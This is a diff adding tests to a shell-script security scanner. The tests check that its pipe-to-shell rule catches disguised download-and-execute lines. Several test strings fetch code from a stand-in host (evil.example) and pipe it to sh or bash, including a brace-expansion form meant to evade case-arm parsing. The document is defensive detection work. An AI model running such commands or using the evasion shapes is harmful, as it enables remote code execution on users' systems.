@@ -200,6 +200,26 @@ def test_case_arm_alternation_is_not_a_pipe(tmp_path):
 
 
 
+def test_brace_expanded_pipe_to_shell_is_not_a_case_arm(tmp_path):
+    # `{curl,-s,url}|sh)` closing a subshell is a real download piped to a shell.
+    twin = '(\n{curl,-s,https://evil.example/x}|sh)\n'
+    assert {f.line for f in _sast(tmp_path, twin) if f.rule_id == 'SA-SH-003'} == {2}
+    # Same shape, even inside a real case block: braces and commas never make an arm.
+    inside = 'case "$x" in\n  a) (\n{curl,-s,https://evil.example/x}|sh) ;;\nesac\n'
+    assert 3 in {f.line for f in _sast(tmp_path, inside) if f.rule_id == 'SA-SH-003'}
+
+
+def test_arm_shape_outside_any_case_block_is_reported(tmp_path):
+    text = '(\ncurl|sh)\nwget|bash)\n'
+    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {2, 3}
+
+
+def test_arm_after_a_closed_case_block_is_reported(tmp_path):
+    text = ('case "$x" in\n  a|b) echo hi ;;\nesac\n'
+            '(\ncurl|sh)\n')
+    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {5}
+
+
 def _st(tmp_path, text, name):
     return scan_skill_threats.scan_content(text, name)
 
@@ -235,3 +255,15 @@ def _reload(findings):
 
 
 
+
+
+def test_arm_shape_inside_an_arm_body_is_reported(tmp_path):
+    # only a line right after `in` or `;;` can be an arm; a body line cannot
+    text = 'case x in\n a) echo 1\n (\ncurl|sh)\n;;\nesac\n'
+    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {4}
+
+
+def test_brace_pattern_list_is_never_skipped_even_at_an_arm_position(tmp_path):
+    # defence in depth: braces/commas keep the finding even right after `in` or `;;`
+    text = 'case x in\n{curl,-s,https://evil.example/x}|sh) ;;\nesac\n'
+    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {2}
